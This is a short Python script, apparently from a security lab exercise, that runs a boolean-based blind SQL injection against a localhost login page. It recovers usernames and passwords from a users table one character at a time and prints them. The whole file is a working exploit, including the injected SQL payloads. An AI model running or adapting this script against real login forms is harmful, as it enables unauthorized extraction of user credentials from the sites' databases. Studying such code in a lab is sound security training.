import urllib.request
import urllib.parse
import string

TARGET_URL = "http://localhost/lab09/login.php"
VALID_SIGNAL = "Printing cat"
CHARS = string.ascii_letters + string.digits

def request_true(payload):
    params = urllib.parse.urlencode({"u": payload, "p": "x"})
    try:
        with urllib.request.urlopen(f"{TARGET_URL}?{params}") as response:
            return VALID_SIGNAL in response.read().decode("utf-8")
    except:
        return False

def extract_data():
    for row in range(100):
        username = ""
        for pos in range(1, 64):
            found = False
            for char in CHARS:
                sql = f'" OR (SELECT ASCII(SUBSTRING(username,{pos},1)) FROM users LIMIT 1 OFFSET {row})={ord(char)} -- '
                if request_true(sql):
                    username += char
                    found = True
                    break
            if not found: break
            
        if not username: 
            break

        password = ""
        for pos in range(1, 64):
            found = False
            for char in CHARS:
                sql = f'" OR (SELECT ASCII(SUBSTRING(password,{pos},1)) FROM users LIMIT 1 OFFSET {row})={ord(char)} -- '
                if request_true(sql):
                    password += char
                    found = True
                    break
            if not found: break

        print(f"Row {row}: {username} / {password}")

if __name__ == "__main__":
    extract_data()
